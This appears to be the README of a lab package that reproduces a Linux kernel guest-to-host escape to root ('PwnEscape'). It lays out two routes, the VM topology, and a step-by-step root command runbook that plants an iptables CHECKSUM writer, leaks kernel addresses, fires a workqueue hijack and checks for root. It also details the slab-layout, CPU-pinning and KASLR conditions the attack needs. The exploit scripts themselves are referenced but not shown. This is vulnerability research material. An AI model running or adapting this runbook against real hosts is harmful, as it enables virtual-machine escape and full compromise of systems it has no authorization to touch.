# PwnEscape Lab

Reproduction package for the PwnEscape guest-to-host escape against
**Linux 6.8.0-139-generic (pre-fix, without commit `6785011f8b16`)**.

This package contains the two primary RCE routes, the environment description,
the driver scripts, and the observers. It is a **host-fixture model**, not a
strict guest-only exploit.

> **Read this first:** both root routes require an administrator-configured
> packet writer in the host's IPv4 option path (`xt_CHECKSUM` at
> `mangle/INPUT`, or an `nft` payload `SET` at `input/mangle`). The audited
> default Ubuntu 26.04 / libvirt 12.0.0 host has no such writer. Without that
> fixture, no end-to-end root chain was demonstrated.

---

## 1. Route matrix

| Report | Route | Result | Writer | Payload source | Observer |
|---|---|---|---|---|---|
| [REPORT-01](REPORT-01-r6-observer-free.md) | **r6**: 255-byte guest-visible window → workqueue hijack | **host root** (2026-10-19 14:14Z) | `xt_CHECKSUM` at `mangle/INPUT` | **guest-visible window** (`pwq`, `poolhead`, KASLR) | absolute `V/W` geometry + abort gates |
| [REPORT-02](REPORT-02-r1-nft-stage1.md) | **r1**: nft Stage-1 payload SET → workqueue hijack | **host root** (2026-10-19 14:10Z) | `nft` `@nh,168,8 set` at `input/mangle` | observer (`pwq`, `poolhead`, KASLR) | CO-RE + bpftrace |

**Recommendation:** use **REPORT-01 (r6)** as the primary demonstration.
The workqueue payload values are derived from a frame the guest can capture,
and the only remaining observer role is the absolute `V/W` slot geometry.
REPORT-02 is the alternative when the target has `nft` but not
`xt_CHECKSUM`.

---

## 2. Topology

```
L0  libvirt host                 snapshot control
└── L1  pwnescape-lab             192.168.122.204   6.8.0-139-generic
    └── L2  l2-attacker           192.168.250.114   Ubuntu 24.04, 6.8.0-142
         network pwnescape-isolated
         bridge virbr-pwn         192.168.250.1
         virtio-net               enp1s0
```

- L1 is the victim host. L2 is the attacker VM.
- The `r6a`/`r6b` veth pair is a deterministic host-side injection fixture used
  by the r6 driver. It is separate from `virbr-pwn`.
- The `fd00:1::1/64` address on `virbr-pwn` and the failed IPv6 neighbour
  routes create the `rt6_probe_deferred` work item used by the workqueue
  overwrite.

Full environment details, package requirements, build commands, sysctls, and
recovery steps are in **[LAB-ENV.md](LAB-ENV.md)**.

---

## 3. Quick start

All host commands run as root on **L1**. The guest commands run as root on
**L2**.

```bash
# 0. Copy this directory to L1, then deploy the tools.
sudo bash scripts/common/install.sh
sudo bash scripts/common/check_env.sh

# 1. Host fixture: veth pair, IPv6 probe route, listener, CHECKSUM writer.
sudo bash scripts/common/r6veth_up.sh
sudo python3 scripts/common/listen_on.py &
sudo iptables -t mangle -A INPUT -p tcp --dport 7778 \
  -j CHECKSUM --checksum-fill
sudo ip -6 addr add fd00:1::1/64 dev virbr-pwn nodad
sudo sysctl -qw net.ipv6.conf.virbr-pwn.router_probe_interval=10
sudo sysctl -qw net.ipv4.tcp_synack_retries=12

# 2. Build the CO-RE observer (r6obs) if it is not already built.
sudo bash scripts/common/r6obs_build.sh

# 3. Read-only eligibility gate. Accept only "ELIGIBLE with hit=N".
sudo python3 scripts/common/r6_host_gate2.py 10 0x7b00

# 4. Leak the 255-byte window and derive pwq / poolhead / kbase.
sudo python3 scripts/r6/r6read.py 40 0x7c30

# 5. Put the derived values into r6fire.py (top of the file), then run the
#    dry/fire pair. The script uses two fresh [V][W] pairs.
sudo python3 scripts/r6/r6fire.py 60 0x7e00

# Or automate steps 4-5 (leak, patch a run copy, dry/fire):
sudo bash scripts/r6/run_r6.sh 40 0x7c30 0x7e00

# 6. Verify.
cat /tmp/pwned
```

The commands above are the r6 route. The r1 route has its own runbook in
REPORT-02.

---

## 4. Global constraints

1. **Kernel:** `6.8.0-139-generic`, pre-fix. The fix adds
   `ip_check_csum_start()` and checks `csum_start >= network_header + ip_hdrlen`
   at the checksum consumers. A patched kernel rejects the writer step.
2. **Writer:** an in-window writer that changes live IPv4 option bytes
   **after** `ip_options_compile()` and **before** `tcp_v4_save_options()` /
   `__ip_options_echo()`.
   - `mangle/INPUT` `xt_CHECKSUM --checksum-fill` (r6)
   - `input/mangle` `nft` payload `SET` (r1)
   - `PREROUTING` is not equivalent (options are compiled afterwards).
   - `POSTROUTING` / TC egress are too late.
   - `FORWARD` only reaches `ip_forward_options()`, not the local echo.
3. **Allocator:** the saved-options object (`dopt`, `kmalloc-64`) and the
   `rt6_probe_deferred` work object (`kmalloc-64`) must be in the **same
   randomized `kmalloc-rnd-XX-64` cache**. This is a per-boot lottery; use the
   gate and cold-boot until `ELIGIBLE`.
4. **CPU:** the vhost worker must be pinned to one CPU (CPU7 in the evidence),
   and the CPU7 kworkers must be `SCHED_IDLE` for the critical section. The
   sender uses `SCHED_FIFO 50` and completes `RST → probe → RST → overflower`
   in one section.
5. **Geometry:** `[S_b][S_v][S_w]` must be adjacent 64-byte slots on the same
   active slab page. The r6 route still needs an absolute `V/W` oracle for the
   payload's self-pointers; the 255-byte window supplies `pwq`, `poolhead`, and
   KASLR, but not `V` or `W`.
6. **Gates:** always run the dry write first. Abort on any mismatch. Never send
   `0xFF00`. The 224-byte fire copy can hit an unrelated `kmalloc-64` object if
   the slot geometry is wrong, which wedges the host.

---

## 5. What each report contains

Each `REPORT-*.md` is self-contained and contains:

- the exact lab environment and kernel version;
- the source-code path and the key code for every primitive;
- the allocation/layout geometry;
- the complete driver scripts (embedded in the report and also stored under
  `scripts/`);
- the exact run sequence, gates, and expected output;
- the limitations.

`LAB-ENV.md` contains the full host/guest setup, build dependencies, sysctls,
CPU pinning, snapshot/recovery procedure, and the tool inventory.

---

## 6. Directory layout

```
PwnEscape-lab/
├── README.md
├── LAB-ENV.md
├── REPORT-01-r6-observer-free.md
├── REPORT-02-r1-nft-stage1.md
├── scripts/
│   ├── common/        install, listener, r6obs build, gate, veth
│   ├── r6/            r6read.py, r6fire.py, r6guestsniff.py, self-check
│   └── r1/            r7_final4.py, r8waiter.py, r7_guest.py, r7_obs4.bt,
│                      r7_gate2.sh, r7_gateobs.bt, r7_ftrace.sh, r7_ftparse.py
└── runbooks/
    └── r6-observer-free-runbook.md
```

Evidence is **not bundled** in this package. The reports retain the result,
gate, and limitation summaries; the original evidence was removed by request.

---

## 7. Result summary

| Route | Result |
|---|---|
| r6 | `/tmp/pwned` = `uid=0(root)`; SHA-256 `5ef391d886d04116cf84b584ae37ef136f83950ab69b7bfb2a6da7506f7b3a57` |
| r1 | `/tmp/pwned` = `uid=0(root)`; boot 35, nft Stage-1 |

The reports state the original provenance caveats. The r1 result is
transcript-consistent but provenance **QUALIFIED**; it is not a fully
independent reproduction.

---

## 8. Scope and non-goals

- This package documents **host-fixture** chains. It does not claim a
  zero-configuration escape from a default libvirt host.
- It does not include the non-public "Part 2" allocator shaping from the
  original blog.
- Non-RCE fallbacks and the historical R7 route were removed from this package
  by request.
- All work was performed in an isolated lab. Use only on systems you own or
  are authorized to test.
